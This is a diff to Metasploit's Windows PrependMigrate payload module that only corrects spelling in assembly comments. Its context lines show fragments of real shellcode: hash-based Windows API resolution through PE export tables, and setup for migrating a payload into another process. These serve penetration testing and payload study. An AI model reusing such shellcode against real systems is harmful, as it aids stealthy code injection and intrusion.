@@ -83,7 +83,7 @@ module Msf::Payload::Windows::PrependMigrate
     not_lowercase:              ;
       ror edi, 13               ; Rotate right our hash value
       add edi, eax              ; Add the next byte of the name
-      loop loop_modname         ; Loop untill we have read enough
+      loop loop_modname         ; Loop until we have read enough
 
       ; We now have the module hash computed
       push edx                  ; Save the current position in the module list for later
@@ -135,7 +135,7 @@ module Msf::Payload::Windows::PrependMigrate
       pop ebx                   ; Clear off the current modules hash
       pop ebx                   ; Clear off the current position in the module list
       popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
-      pop ecx                   ; Pop off the origional return address our caller will have pushed
+      pop ecx                   ; Pop off the original return address our caller will have pushed
       pop edx                   ; Pop off the hash value our caller will have pushed
       push ecx                  ; Push back the correct return value
       jmp eax                   ; Jump into the required function
@@ -330,11 +330,11 @@ module Msf::Payload::Windows::PrependMigrate
     not_lowercase:             ;
       ror r9d, 13              ; Rotate right our hash value
       add r9d, eax             ; Add the next byte of the name
-      loop loop_modname        ; Loop untill we have read enough
+      loop loop_modname        ; Loop until we have read enough
       ; We now have the module hash computed
       push rdx                 ; Save the current position in the module list for later
       push r9                  ; Save the current module hash for later
-      ; Proceed to itterate the export address table
+      ; Proceed to iterate the export address table
       mov rdx, [rdx+32]        ; Get this modules base address
       mov eax, dword [rdx+60]  ; Get PE header
       add rax, rdx             ; Add the modules base address
@@ -494,7 +494,7 @@ module Msf::Payload::Windows::PrependMigrate
       mov r8, #{payloadsize} ; stageless size
       EOS
     else
-      # otherwise we'll juse reuse r9 (4096) for size
+      # otherwise we'll just reuse r9 (4096) for size
       migrate_asm << <<-EOS
       mov r8,r9                 ; size
       EOS
